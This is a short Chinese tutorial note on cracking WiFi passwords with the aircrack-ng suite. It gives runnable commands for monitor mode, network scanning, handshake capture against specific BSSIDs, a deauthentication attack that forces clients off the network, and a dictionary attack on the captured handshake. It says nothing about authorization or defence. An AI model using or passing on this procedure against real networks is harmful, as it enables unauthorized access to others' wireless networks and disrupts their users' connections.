
## wifi破解：
>参考视频：https://www.bilibili.com/video/BV1nvceznEN3?t=5.2

1、开启无线网卡监听模式，默认网卡只监听自己网卡流经的数据包，不是自己网卡的不收，开启监听之后什么数据包都接收

`airmon-ng start wlan0 `

查看网卡监听状态

`airmon-ng`

假设看到网卡名字是wlan0mon
2、扫描范围，扫描有哪些wf信号，看下图

`airodump-ng wlan0mon`

3、抓wifi握手包，我们刚开始接触这个wifi的时候，会自动带着账号密码来和wifi进行握手，通过之后就给我们一个令牌，以后每次发数据包就带上这个令牌就行了，如果断开连接，服务端就会把令牌回收，我们再去连接的话就要再带着账号密码进行握手。

`airodump-ng --bssid CA:4B:18:D4:E8:6F -c 11 -w jaden wlan0mon`

`airodump-ng --bssid D4:DA:21:5D:FF:4E -c 11 -w jaden wlan0mon`

# -c是选择频道，我抓下面的荣耀magicwifi的包，它的频道是11,-w是将抓到的数据包保存起来，保存到当前目录下的jaden文件中

4、断开已经连接wifi的设备，让他重新连接，为了就是要握手包，如果有人正好这时候连接wifi呢，就不需要断开某些设备了。

`aireplay-ng -0 2 -c 12:E2:C9:BA:2D:88 -a D4:DA:21:5D:FF:4E wlan0mon`
|命令|模式|次数|cc|客户机MAC|xx|WiFi的MAC|网卡|
|------------|---|-|----|-------------------|---|-------------------|---------|
|aireplay-ng |-0 |2| -c | 12:E2:C9:BA:2D:88 | -a| D4:DA:21:5D:FF:4E | wlan0mon|




`-0` death模式，2为发送次数，又叫死亡数据包

`-C` 你所选择要断网操作的客户机MAC  (模仿LUQ发反认证包)

`-a` 相应WiFi的MAC

5、破解密码(撞库)

`aircrack-ng -w 1pass00.txt jaden-01.cap` 
|命令|模式|字典|密文| 
|-------------|---|-------------|--------------|
| aircrack-ng |-w | 1pass00.txt | jaden-01.cap |

#前面抓过包，可能不是jaden-01.txt,也可能是02、03等，找数字最大的那个cap文件
即可。
